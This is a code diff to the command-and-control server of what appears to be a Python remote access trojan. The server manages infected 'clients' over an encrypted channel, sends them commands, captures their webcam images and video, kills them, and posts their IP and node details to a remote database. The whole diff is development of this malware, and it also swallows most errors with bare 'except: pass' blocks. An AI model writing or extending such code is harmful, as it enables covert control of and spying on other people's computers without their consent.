@@ -138,26 +138,22 @@ class Server(threading.Thread):
     def _long_to_bytes(self, x):
         try:
             return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
-        except ValueError as e:
-            self._error("_long_to_bytes failed with error: {}\nDecimal: '{}'\nHexidecimal: '{}".format(str(e), long(x), hex(long(x))))
-            
+        except: pass
+
     def _bytes_to_long(self, x):
         try:
             return long(bytes(x).encode('hex'), 16)
-        except Exception as e:
-            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt failed with error: {}'.format(str(e)))
+        except: pass
 
     def _prompt(self, data):
         try:
             return raw_input(self._prompt_color + self._prompt_style + data)
-        except Exception as e:
-            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt function failed with error: {}'.format(str(e)))
+        except: pass
     
     def _error(self, data):
         try:
             print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + self._text_color + 'error: ' + self._text_style + data + '\n')
-        except Exception as e:
-            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'error function failed with error: {}'.format(str(e)))
+        except: pass
     
     def _print(self, data):
         if self.current_client:
@@ -165,7 +161,9 @@ class Server(threading.Thread):
             print('\n' + self._text_color + self._text_style + data + '\n')
             self.current_client.lock.set()
         else:
+            self.lock.clear()
             print('\n' + self._text_color + self._text_style + data + '\n')
+            self.lock.set()
 
     def _settings(self, target, setting, option):
         target  = target.lower()
@@ -197,7 +195,7 @@ class Server(threading.Thread):
                 return "text style changed to '{}'".format(option)
             else:
                 return "usage:      settings text <option> [value]"
-        return self.run()
+        self._return()
 
     def _return(self):
         if self.current_client:
@@ -209,14 +207,19 @@ class Server(threading.Thread):
         return self.run()
 
     def _diffiehellman(self, conn):
-        g  = 2
-        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-        a  = self._bytes_to_long(os.urandom(self.__encryption__.key_size))
-        xA = pow(g, a, p)
-        conn.send(self._long_to_bytes(xA))
-        xB = self._bytes_to_long(conn.recv(256))
-        x  = pow(xB, a, p)
-        return sys.modules['hashlib'].new(self.__encryption__.hash_algo, self._long_to_bytes(x)).digest()
+        try:
+            g  = 2
+            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            a  = self._bytes_to_long(os.urandom(self.__encryption__.key_size))
+            xA = pow(g, a, p)
+            conn.send(self._long_to_bytes(xA))
+            xB = self._bytes_to_long(conn.recv(256))
+            x  = pow(xB, a, p)
+            return sys.modules['hashlib'].new(self.__encryption__.hash_algo, self._long_to_bytes(x)).digest()
+        except: pass
+        time.sleep(1)
+        return self._diffiehellman(conn)
+            
 
     def _encrypt(self, data, key):
         data    = self._pad(data)
@@ -237,24 +240,26 @@ class Server(threading.Thread):
         return base64.b64encode(b''.join(result))
 
     def _decrypt(self, data, key):
-        data    = base64.b64decode(data)
-        blocks  = self._block(data)
-        vector  = blocks[0]
-        result  = []
-        for block in blocks[1:]:
-            v0, v1 = struct.unpack('!' + "2L", block)
-            k = struct.unpack('!' + "4L", key)
-            delta, mask = 0x9e3779b9L, 0xffffffffL
-            sum = (delta * self.__encryption__.num_rounds) & mask
-            for round in range(self.__encryption__.num_rounds):
-                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                sum = (sum - delta) & mask
-                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-            decode = struct.pack('!' + "2L", v0, v1)
-            output = self._xor(vector, decode)
-            vector = block
-            result.append(output)
-        return ''.join(result).rstrip('\x00')
+        try:
+            data    = base64.b64decode(data)
+            blocks  = self._block(data)
+            vector  = blocks[0]
+            result  = []
+            for block in blocks[1:]:
+                v0, v1 = struct.unpack('!' + "2L", block)
+                k = struct.unpack('!' + "4L", key)
+                delta, mask = 0x9e3779b9L, 0xffffffffL
+                sum = (delta * self.__encryption__.num_rounds) & mask
+                for round in range(self.__encryption__.num_rounds):
+                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+                    sum = (sum - delta) & mask
+                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+                decode = struct.pack('!' + "2L", v0, v1)
+                output = self._xor(vector, decode)
+                vector = block
+                result.append(output)
+            return ''.join(result).rstrip('\x00')
+        except: pass
 
     def webcam_client(self, mode=None):
         if not self.current_client:
@@ -303,35 +308,37 @@ class Server(threading.Thread):
                 client.lock.set()
         elif mode == 'image':
             self.send_client('webcam image', client.name)
-            result = self.recv_client(client.name)
+            _, result = self.recv_client(client.name)
             return result
         elif mode == 'video':
             self.send_client('webcam video', client.name)
-            result = self.recv_client(client.name)
+            _, result = self.recv_client(client.name)
             return result
         return client.run()
     
     def encrypt(self, data, client_id):
-        if int(client_id) in self.clients:
+        if str(client_id).isdigit() and int(client_id) in self.clients:
             key = self.clients[int(client_id)].dhkey
             return self._encrypt(data, key)
 
     def decrypt(self, data, client_id):
-        if int(client_id) in self.clients:
+        if str(client_id).isdigit() and int(client_id) in self.clients:
             key = self.clients[int(client_id)].dhkey
             return self._decrypt(data, key)
       
     def send_client(self, msg, client_id):
-        if int(client_id) in self.clients:
-            client = self.clients[int(client_id)]
-            data = self.encrypt(msg, client.name) + '\n'
-            client.conn.sendall(data)
+        if str(client_id).isdigit() and int(client_id) in self.clients:
+            try:
+                client = self.clients[int(client_id)]
+                data = self.encrypt(msg, client.name) + '\n'
+                client.conn.sendall(data)
+            except: pass
     
     def recv_client(self, client_id):
-        if int(client_id) in self.clients:
+        if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
             buffer, method, message  = "", "", ""
-            if client:
+            try:
                 while "\n" not in buffer:
                     try:
                         buffer += client.conn.recv(4096)
@@ -341,27 +348,33 @@ class Server(threading.Thread):
                     method, _, message = buffer.partition(':')
                     message = server.decrypt(message.rstrip(), client.name)
                     return (method, message)
-            return
+            except: pass
         else:
             self._error('Invalid Client ID')
     
     def get_clients(self):
-        return [v for _, v in self.current_client.items()]
+        return [v for _, v in self.clients.items()]
 
     def select_client(self, client_id):
-        if int(client_id) not in self.clients:
+        if not str(client_id).isdigit() or int(client_id) not in self.clients:
             self._error('Invalid Client ID')
         else:
-            self.lock.clear()
-            self.current_client = self.clients[int(client_id)]
-            if not self.current_client.lock.is_set():
-                self.current_client.lock.set()
-            self._print('\n\nClient {} selected'.format(client_id))
+            try:
+                self.lock.clear()
+                self.current_client = self.clients[int(client_id)]
+                if not self.current_client.lock.is_set():
+                    self.current_client.lock.set()
+                self._print('\n\nClient {} selected'.format(client_id))
+            except Exception as e:
+                self._error(str(e))
         self._return()
 
-    def background_client(self):
-        if self.current_client:
-            self.current_client.lock.clear()
+    def background_client(self, client_id=None):
+        if not client_id:
+            if self.current_client:
+                self.current_client.lock.clear()
+        elif str(client_id).isdigit() and int(client_id) in self.clients:
+                self.clients[int(client_id)].lock.clear()
         self.current_client = None
         self.lock.set()
         return self.run()
@@ -374,18 +387,17 @@ class Server(threading.Thread):
                 self._error('Message to client {} failed with error: {}'.format(client.name, str(e)))
     
     def remove_client(self, client_id):
-        if int(client_id) not in self.clients:
-            self._error('Invalid Client ID')
+        if not str(client_id).isdigit() or int(client_id) not in self.clients:
+            return
         else:
             client = self.clients.pop(int(client_id), None)
             client.lock.clear()
-            del client
             if not self.current_client:
                 self.lock.clear()
                 self._print('Client {} disconnected'.format(client_id))
                 self.lock.set()
                 return self.run()
-            elif int(client_id) != self.current_client.name:
+            elif int(client_id) == self.current_client.name:
                 self.current_client.lock.clear()
                 self._print('Client {} disconnected'.format(client_id))
                 self.current_client.lock.set()
@@ -397,7 +409,7 @@ class Server(threading.Thread):
                 return self.run()
             
     def kill_client(self, client_id):
-        if int(client_id) in self.clients:
+        if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients.get(int(client_id))
             self.send_client('kill', client.name)
             client.conn.close()
@@ -420,17 +432,23 @@ class Server(threading.Thread):
         finally:
             sys.exit(0)
     
-    def settings(self, args):
-        return self._settings(*args.split())
+    def settings(self, args=None):
+        if not args:
+            print(colorama.Fore.WHITE + '\n\t\tSettings')
+            print(colorama.Fore.WHITE + 'Text: ' + self._text_color + self._text_style + 'default text color + style')
+            print(colorama.Fore.WHITE + '\tColor:' + self._prompt_color + self._prompt_style + 'default prompt color + style\n')
+            self._return()
+        else:
+            return self._settings(*args.split())
     
     def add_to_db(self, client_id):
         if str(client_id).isdigit() and int(client_id) in self.clients:
-            client = self.clients[int(client_id)]
+            client      = self.clients[int(client_id)]
+            method,data = self.recv_client(client.name)
+            client.info = json.loads(data)
             if self.db and 'add_client' in self.db:
-                post  = requests.post(self.db['add_client'], data=client.info).content
-                uid   = sys.modules['hashlib'].md5(bytes(client.info.get('ip')) + bytes(client.info.get('node'))).hexdigest()
-                if post != uid:
-                    self._error('client id did not match db record: {}'.format(post))
+                post  = bytes(requests.post(self.db['add_client'], data=client.info).content)
+                uid   = sys.modules['hashlib'].new(self.__encryption__.hash_algo, '%s%d' % (str(client.info.get('ip')), int(client.info.get('node')))).hexdigest()
                 return post
             else:
                 print('no database found')
@@ -446,12 +464,10 @@ class Server(threading.Thread):
                 dhkey       = self._diffiehellman(conn)
                 client      = ConnectionHandler(conn, addr, name, dhkey)
                 self.clients[name] = client
+                client.id   = self.add_to_db(client.name)
                 client.start()
             except Exception as e:
-                print('manager failed with error: {}\nexiting...'.format(str(e)))
-                break
-        self.exit_status = True
-        sys.exit(0)
+                print("Client manager error: {}".format(str(e)))
 
     def usage(self):
         print
@@ -484,12 +500,20 @@ class Server(threading.Thread):
             cmd_buffer = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
             cmd, _, action = cmd_buffer.partition(' ')
             if cmd in self.commands:
-                output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                try:
+                    output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
+                except Exception as e1:
+                    output = str(e1)
+            elif cmd == 'cd':
+                    try:
+                        os.chdir(action)
+                    except Exception as e2:
+                        output = 'change directory error: {}'.format(str(e2))
             else:
                 try:
                     output = subprocess.check_output(cmd_buffer, shell=True)
-                except Exception as e2:
-                    output = str(e2)
+                except Exception as e3:
+                    output = str(e3)
             if output and len(output):
                 self._print(output)
         print('Server shutting down')
@@ -523,9 +547,8 @@ class ConnectionHandler(threading.Thread):
             try:
                 if server.exit_status:
                     break
-                if self.id:
-                    self.lock.wait()
                 data = ''
+                self.lock.wait()
                 method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
                 if 'prompt' in method:
                     self.prompt = data.format(self.name)
@@ -535,12 +558,8 @@ class ConnectionHandler(threading.Thread):
                         result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                         if result:
                             server._print(result)
-                        continue
                     else:
                         server.send_client(command, self.name)
-                elif 'start' in method:
-                    self.info  = json.loads(data)
-                    self.id    = server.add_to_db(self.name)
                 else:
                     if data:
                         server._print(data)
